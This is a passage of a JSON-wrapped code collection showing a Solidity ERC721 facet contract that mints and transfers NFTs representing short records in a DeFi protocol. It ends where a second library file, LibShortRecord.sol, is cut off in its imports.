      "content": "// SPDX-License-Identifier: GPL-3.0-only\npragma solidity 0.8.21;\n\nimport {IERC721} from \"@openzeppelin/contracts/token/ERC721/IERC721.sol\";\nimport {IERC721Receiver} from \"@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol\";\n\nimport {IDiamond} from \"interfaces/IDiamond.sol\";\nimport {Constants} from \"contracts/libraries/Constants.sol\";\nimport {Events} from \"contracts/libraries/Events.sol\";\nimport {Errors} from \"contracts/libraries/Errors.sol\";\nimport {STypes} from \"contracts/libraries/DataTypes.sol\";\nimport {Modifiers} from \"contracts/libraries/AppStorage.sol\";\nimport {LibDiamond} from \"contracts/libraries/LibDiamond.sol\";\nimport {LibShortRecord} from \"contracts/libraries/LibShortRecord.sol\";\n\n// import {console} from \"contracts/libraries/console.sol\";\n\ncontract ERC721Facet is Modifiers, IERC721 {\n    /**\n     * @dev Returns the number of tokens in ``owner``'s account.\n     */\n    function balanceOf(address owner) external view returns (uint256 balance) {\n        if (owner == address(0)) {\n            revert Errors.ERC721InvalidOwner(address(0));\n        }\n\n        uint256 length = s.assets.length;\n        for (uint256 i; i < length;) {\n            STypes.ShortRecord[] memory shortRecords =\n                IDiamond(payable(address(this))).getShortRecords(s.assets[i], owner);\n            for (uint256 j; j < shortRecords.length;) {\n                if (shortRecords[j].tokenId != 0) {\n                    balance++;\n                }\n                unchecked {\n                    j++;\n                }\n            }\n            unchecked {\n                ++i;\n            }\n        }\n    }\n\n    /**\n     * @dev Returns whether `tokenId` exists.\n     *\n     * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.\n     *\n     * Tokens start existing when they are minted (`_mint`),\n     * and stop existing when they are burned (`_burn`).\n     */\n    function _exists(uint256 tokenId) internal view virtual returns (bool) {\n        return _ownerOf(tokenId) != address(0);\n    }\n\n    /**\n     * @dev Returns the owner of the `tokenId`. Does NOT revert if token doesn't exist\n     */\n    function _ownerOf(uint256 tokenId) internal view virtual returns (address) {\n        return s.nftMapping[tokenId].owner;\n    }\n\n    /**\n     * @dev Returns the owner of the `tokenId` token.\n     *\n     * Requirements:\n     *\n     * - `tokenId` must exist.\n     */\n    function ownerOf(uint256 tokenId) public view virtual returns (address) {\n        address owner = _ownerOf(tokenId);\n        if (owner == address(0)) {\n            revert Errors.ERC721NonexistentToken(tokenId);\n        }\n        return owner;\n    }\n\n    /**\n     * @dev Safely transfers `tokenId` token from `from` to `to`.\n     *\n     * Requirements:\n     *\n     * - `from` cannot be the zero address.\n     * - `to` cannot be the zero address.\n     * - `tokenId` token must exist and be owned by `from`.\n     * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.\n     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\n     *\n     * Emits a {Transfer} event.\n     */\n\n    function safeTransferFrom(address from, address to, uint256 tokenId) public virtual {\n        safeTransferFrom(from, to, tokenId, \"\");\n    }\n\n    /**\n     * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients\n     * are aware of the ERC721 protocol to prevent tokens from being forever locked.\n     *\n     * Requirements:\n     *\n     * - `from` cannot be the zero address.\n     * - `to` cannot be the zero address.\n     * - `tokenId` token must exist and be owned by `from`.\n     * - If the caller is not `from`, it must have been allowed to move this token by either {approve} or {setApprovalForAll}.\n     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\n     *\n     * Emits a {Transfer} event.\n     */\n\n    function safeTransferFrom(\n        address from,\n        address to,\n        uint256 tokenId,\n        bytes memory data\n    ) public virtual {\n        transferFrom(from, to, tokenId);\n\n        if (!_checkOnERC721Received(from, to, tokenId, data)) {\n            revert Errors.ERC721InvalidReceiver(to);\n        }\n    }\n\n    /**\n     * @dev Transfers `tokenId` token from `from` to `to`.\n     *\n     * WARNING: Note that the caller is responsible to confirm that the recipient is capable of receiving ERC721\n     * or else they may be permanently lost. Usage of {safeTransferFrom} prevents loss, though the caller must\n     * understand this adds an external call which potentially creates a reentrancy vulnerability.\n     *\n     * Requirements:\n     *\n     * - `from` cannot be the zero address.\n     * - `to` cannot be the zero address.\n     * - `tokenId` token must be owned by `from`.\n     * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(address from, address to, uint256 tokenId) public {\n        // @dev ensure the tokenId can be downcasted to 40 bits\n        if (tokenId > type(uint40).max) revert Errors.InvalidTokenId();\n\n        if (\n            msg.sender != from && !s.isApprovedForAll[from][msg.sender]\n                && msg.sender != s.getApproved[tokenId]\n        ) revert Errors.ERC721InsufficientApproval(msg.sender, tokenId);\n\n        address owner = ownerOf(tokenId);\n        if (owner != from) {\n            revert Errors.ERC721IncorrectOwner(from, tokenId, owner);\n        }\n        if (to == address(0)) {\n            revert Errors.ERC721InvalidReceiver(address(0));\n        }\n\n        STypes.NFT memory nft = s.nftMapping[tokenId];\n        address asset = s.assetMapping[nft.assetId];\n\n        //@dev If NFT does not exist, ERC721NonexistentToken() will trigger\n        LibShortRecord.transferShortRecord(asset, from, to, uint40(tokenId), nft);\n\n        delete s.getApproved[tokenId];\n\n        emit Events.Transfer(from, to, tokenId);\n    }\n\n    /**\n     * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.\n     *\n     * See {setApprovalForAll}\n     */\n    function isApprovedForAll(address owner, address operator)\n        public\n        view\n        returns (bool)\n    {\n        return s.isApprovedForAll[owner][operator];\n    }\n\n    /**\n     * @dev Gives permission to `to` to transfer `tokenId` token to another account.\n     * The approval is cleared when the token is transferred.\n     *\n     * Only a single account can be approved at a time, so approving the zero address clears previous approvals.\n     *\n     * Requirements:\n     *\n     * - The caller must own the token or be an approved operator.\n     * - `tokenId` must exist.\n     *\n     * Emits an {Approval} event.\n     */\n    function approve(address to, uint256 tokenId) external {\n        // @dev ensure the tokenId can be downcasted to 40 bits\n        if (tokenId > type(uint40).max) revert Errors.InvalidTokenId();\n        address owner = _ownerOf(tokenId);\n\n        if (to == owner) {\n            revert Errors.ERC721InvalidOperator(owner);\n        }\n\n        if (msg.sender != owner && !isApprovedForAll(owner, msg.sender)) {\n            revert Errors.ERC721InvalidApprover(msg.sender);\n        }\n\n        s.getApproved[tokenId] = to;\n\n        emit Events.Approval(owner, to, tokenId);\n    }\n\n    /**\n     * @dev Approve or remove `operator` as an operator for the caller.\n     * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.\n     *\n     * Requirements:\n     *\n     * - The `operator` cannot be the caller.\n     *\n     * Emits an {ApprovalForAll} event.\n     */\n    function setApprovalForAll(address operator, bool approved) external {\n        if (msg.sender == operator) {\n            revert Errors.ERC721InvalidOperator(msg.sender);\n        }\n        s.isApprovedForAll[msg.sender][operator] = approved;\n        emit Events.ApprovalForAll(msg.sender, operator, approved);\n    }\n\n    /**\n     * @dev Reverts if the `tokenId` has not been minted yet.\n     */\n    function _requireMinted(uint256 tokenId) internal view virtual {\n        if (!_exists(tokenId)) {\n            revert Errors.ERC721NonexistentToken(tokenId);\n        }\n    }\n\n    /**\n     * @dev Returns the account approved for `tokenId` token.\n     *\n     * Requirements:\n     *\n     * - `tokenId` must exist.\n     */\n    function getApproved(uint256 tokenId) external view returns (address operator) {\n        _requireMinted(tokenId);\n        return s.getApproved[tokenId];\n    }\n\n    /**\n     * @notice Mints NFT for active shortRecord\n     * @dev Minters can only mint their own shortRecords\n     *\n     * @param asset The market that will be impacted\n     * @param shortRecordId Id of active shortRecord\n     */\n\n    function mintNFT(address asset, uint8 shortRecordId)\n        external\n        isNotFrozen(asset)\n        nonReentrant\n        onlyValidShortRecord(asset, msg.sender, shortRecordId)\n    {\n        if (shortRecordId == Constants.SHORT_MAX_ID) {\n            revert Errors.CannotMintLastShortRecord();\n        }\n        STypes.ShortRecord storage short =\n            s.shortRecords[asset][msg.sender][shortRecordId];\n\n        if (short.tokenId != 0) revert Errors.AlreadyMinted();\n\n        s.nftMapping[s.tokenIdCounter] = STypes.NFT({\n            owner: msg.sender,\n            assetId: s.asset[asset].assetId,\n            shortRecordId: shortRecordId\n        });\n\n        short.tokenId = s.tokenIdCounter;\n\n        //@dev never decreases\n        s.tokenIdCounter += 1;\n    }\n\n    function tokenURI(uint256 id) public view virtual returns (string memory) {}\n\n    /**\n     * @dev Private function to invoke {IERC721Receiver-onERC721Received} on a target address.\n     * The call is not executed if the target address is not a contract.\n     *\n     * @param from address representing the previous owner of the given token ID\n     * @param to target address that will receive the tokens\n     * @param tokenId uint256 ID of the token to be transferred\n     * @param data bytes optional data to send along with the call\n     * @return bool whether the call correctly returned the expected magic value\n     */\n    function _checkOnERC721Received(\n        address from,\n        address to,\n        uint256 tokenId,\n        bytes memory data\n    ) private returns (bool) {\n        if (to.code.length > 0) {\n            try IERC721Receiver(to).onERC721Received(msg.sender, from, tokenId, data)\n            returns (bytes4 retval) {\n                return retval == IERC721Receiver.onERC721Received.selector;\n            } catch (bytes memory reason) {\n                if (reason.length == 0) {\n                    revert Errors.ERC721InvalidReceiver(to);\n                } else {\n                    /// @solidity memory-safe-assembly\n                    // solhint-disable-next-line no-inline-assembly\n                    assembly {\n                        revert(add(32, reason), mload(reason))\n                    }\n                }\n            }\n        } else {\n            return true;\n        }\n    }\n\n    // This implements ERC-165 (copied from DiamondLoupeFacet.sol)\n    function supportsInterface(bytes4 _interfaceId) external view returns (bool) {\n        LibDiamond.DiamondStorage storage ds = LibDiamond.diamondStorage();\n        return ds.supportedInterfaces[_interfaceId];\n    }\n}"
    },
    {
      "filename": "contracts/libraries/LibShortRecord.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0-only\npragma solidity 0.8.21;\n\nimport {U256, U88, U80} from \"contracts/libraries/PRBMathHelper.sol\";\n\nimport {STypes, SR} from \"contracts/libraries/DataTypes.sol\";\nimport {Errors} from \"contracts/libraries/Errors.sol\";\nimport {Events} from \"contracts/libraries/Events.sol\";\nimport {AppStorage, appStorage} from \"contracts/libraries/AppStorage.sol\";\nimport {Constants} from \"contracts/libraries/Constants.sol\";\nimport {LibAsset} from \"contracts/libraries/LibAsset.sol\";\nimport {LibOrders} from \"contracts/libraries/LibOrders.sol\";\nimport {LibOracle} from \""
    }
  ]
}